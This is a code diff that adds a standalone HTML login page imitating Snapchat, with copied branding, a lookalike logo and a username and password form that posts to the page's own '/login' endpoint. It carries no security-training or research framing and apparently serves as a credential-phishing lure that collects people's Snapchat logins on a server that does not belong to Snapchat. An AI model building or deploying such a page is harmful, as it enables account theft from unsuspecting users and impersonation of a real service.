@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat - Log In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+        .container {
+            background: #fff;
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 420px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+        .logo svg {
+            width: 200px;
+            height: auto;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px;
+            background: #f7f7f7;
+            border: 1px solid #e6e6e6;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #fffc00;
+            background: #fff;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background: #fffc00;
+            border: none;
+            border-radius: 12px;
+            color: #000;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 8px;
+        }
+        .login-btn:hover {
+            background: #e6e300;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #999;
+            font-size: 14px;
+        }
+        .divider::before,
+        .divider::after {
+            content: '';
+            display: inline-block;
+            width: 35%;
+            height: 1px;
+            background: #e6e6e6;
+            vertical-align: middle;
+        }
+        .divider span {
+            padding: 0 12px;
+            vertical-align: middle;
+        }
+        .links {
+            text-align: center;
+            font-size: 14px;
+            margin-top: 16px;
+        }
+        .links a {
+            color: #333;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .signup-text {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 16px;
+            color: #666;
+        }
+        .signup-text a {
+            color: #000;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .signup-text a:hover {
+            text-decoration: underline;
+        }
+        .error-msg {
+            color: #d6202e;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 16px;
+            }
+            .logo svg {
+                width: 150px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 250 60" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="5" width="60" height="50" rx="12" fill="#fffc00" stroke="#000" stroke-width="2"/>
+                <text x="75" y="42" font-family="-apple-system, BlinkMacSystemFont, sans-serif" font-size="32" font-weight="700" fill="#000">Snapchat</text>
+                <circle cx="30" cy="30" r="10" fill="#000"/>
+                <circle cx="30" cy="30" r="5" fill="#fffc00"/>
+            </svg>
+        </div>
+        <form id="loginForm" method="POST" action="/login">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Username or Email" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+            <div class="divider"><span>or</span></div>
+            <div class="links">
+                <a href="#">Forgot your password?</a>
+                <span style="color:#e6e6e6;">|</span>
+                <a href="#">Create an account</a>
+            </div>
+        </form>
+        <div class="signup-text">
+            New to Snapchat? <a href="#">Sign Up</a>
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const btn = this.querySelector('.login-btn');
+            btn.textContent = 'Logging in...';
+            btn.disabled = true;
+        });
+    </script>
+</body>
+</html>
